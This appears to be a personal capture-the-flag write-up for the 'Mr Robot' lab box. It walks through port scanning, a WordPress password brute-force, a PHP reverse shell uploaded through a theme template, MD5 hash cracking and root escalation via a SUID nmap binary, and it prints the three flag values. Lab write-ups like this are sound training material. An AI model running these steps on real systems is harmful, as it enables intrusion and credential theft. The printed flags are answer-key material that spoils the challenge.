# Box Name
Mr Robot
---

## Overview
---
* [[#Enumeration]]
	* rustscan, feroxbuster

* [[#Initial Foothold]]
	* wpscan

* [[#Privilege Escalation]]
	* [[gtfobins]]

---
## Enumeration
---
### nmap

```bash
┌──(kn1ght㉿Kali)-[~/THM/mrrobot]
└─$ rustscan -r 1-65535 -a 10.10.47.245 --ulimit 5000 -- -sCV -oN nmap/all_ports
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/scott/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.47.245:80
Open 10.10.47.245:443
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

PORT    STATE SERVICE  REASON  VERSION
80/tcp  open  http     syn-ack Apache httpd
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: Apache
443/tcp open  ssl/http syn-ack Apache httpd
|_http-title: 400 Bad Request
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
| SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
| -----BEGIN CERTIFICATE-----
| MIIBqzCCARQCCQCgSfELirADCzANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93
| d3cuZXhhbXBsZS5jb20wHhcNMTUwOTE2MTA0NTAzWhcNMjUwOTEzMTA0NTAzWjAa
| MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
| MIGJAoGBANlxG/38e8Dy/mxwZzBboYF64tu1n8c2zsWOw8FFU0azQFxv7RPKcGwt
| sALkdAMkNcWS7J930xGamdCZPdoRY4hhfesLIshZxpyk6NoYBkmtx+GfwrrLh6mU
| yvsyno29GAlqYWfffzXRoibdDtGTn9NeMqXobVTTKTaR0BGspOS5AgMBAAEwDQYJ
| KoZIhvcNAQEFBQADgYEASfG0dH3x4/XaN6IWwaKo8XeRStjYTy/uBJEBUERlP17X
| 1TooZOYbvgFAqK8DPOl7EkzASVeu0mS5orfptWjOZ/UWVZujSNj7uu7QR4vbNERx
| ncZrydr7FklpkIN5Bj8SYc94JI9GsrHip4mpbystXkxncoOVESjRBES/iatbkl0=
|_-----END CERTIFICATE-----
|_http-server-header: Apache

```
### ferox

```bash

```
 - ### robots.txt
 
![[Pasted image 20220522152640.png]]

 - ### downloaded fsocity.dic and key-1-of-3.txt
	 - key 1 
		 - ``` 073403c8a58a1f80d943455fb30724b9 ```
 - ### used wpscan with fsocity.dic to find user:password
	 - found
```bash
[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - elliot / ER28-0652                                                                                                                                                                                                             
Trying elliot / ER28-0652 Time: 00:00:12 <================================================================                                                                                              > (100 / 242) 41.32%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: elliot, Password: ER28-0652

```
---

## Initial Foothold
---
### Word Press 404.php exploit
 - uploaded the pentestmonkey php shell
	received connection on nc listener

```bash
		                                                         
┌──(kn1ght㉿Kali)-[~/THM/mrrobot]
└─$ nc -lnvp 1234                      
listening on [any] 1234 ...
connect to [10.13.13.55] from (UNKNOWN) [10.10.23.106] 47721
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 23:30:10 up 47 min,  0 users,  load average: 0.92, 0.78, 0.50
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

 - Stabilized shell with python
 
```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
daemon@linux:/$ ^Z
zsh: suspended  nc -lnvp 1234
                                                                                                                                                                                                                                           
┌──(kn1ght㉿Kali)-[~/THM/mrrobot]
└─$ stty raw -echo; fg     
[1]  + continued  nc -lnvp 1234

daemon@linux:/$ export TERM=xterm
daemon@linux:/$ 
```

 - found an interesting file in robot's home folder
 ```bash
 daemon@linux:/home/robot$ ls -la
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5

 ```

 - cat password.raw-md5
```bash
daemon@linux:/home/robot$ cat password.raw-md5 
robot:c3fcd3d76192e4007dfb496cca67e13b
```

copied password.raw-md5 to robot.hash on local machine
used JTR to crack the password
```bash
┌──(kn1ght㉿Kali)-[~/THM/mrrobot]
└─$ john --format=raw-md5 --wordlist=/home/scott/rockyou.txt robot.hash
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
abcdefghijklmnopqrstuvwxyz (?)     
1g 0:00:00:00 DONE (2022-05-22 18:48) 2.941g/s 119152p/s 119152c/s 119152C/s bonjour1..123092
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 

```

used password to su to robot
```bash
robot@linux:~$ id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
robot@linux:~$
```

 - key-2-of-3.txt
	 - 822c73956184f694993bede3eb39f959

---
## Privilege Escalation

- [[GTFObins]]
	- searched for files with suid bit set found
```bash
robot@linux:~$ find / -perm -4000 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap <--
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
robot@linux:~$ 

```

```bash
robot@linux:~$ nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh

# cd /root

# ls -la
total 32
drwx------  3 root root 4096 Nov 13  2015 .
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
-rw-------  1 root root 4058 Nov 14  2015 .bash_history
-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
drwx------  2 root root 4096 Nov 13  2015 .cache
-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-------  1 root root 1024 Sep 16  2015 .rnd
# cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
# 

```

----


